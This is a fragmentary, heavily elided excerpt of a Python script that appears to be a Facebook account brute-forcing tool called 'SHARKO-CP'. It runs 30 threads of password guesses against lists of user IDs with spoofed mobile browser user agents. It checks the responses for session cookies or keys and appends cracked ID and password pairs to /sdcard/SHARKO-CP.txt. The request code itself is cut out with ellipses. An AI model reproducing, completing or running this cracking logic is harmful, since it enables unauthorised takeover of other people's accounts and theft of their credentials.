                ...
                if "server on" in sj:
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print("\033[1;32m CP IDZ SAVED IN >>>>> /SDCARD/SHARKO-CP.TXT")
...
def ffb(ids,names,passlist):
    ...
    "user-agent": ua,
                        ...
                        if "c_user" in MAMBA:
                                ...
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [SHARKO-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SHARKO-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [SHARKO-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SHARKO-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
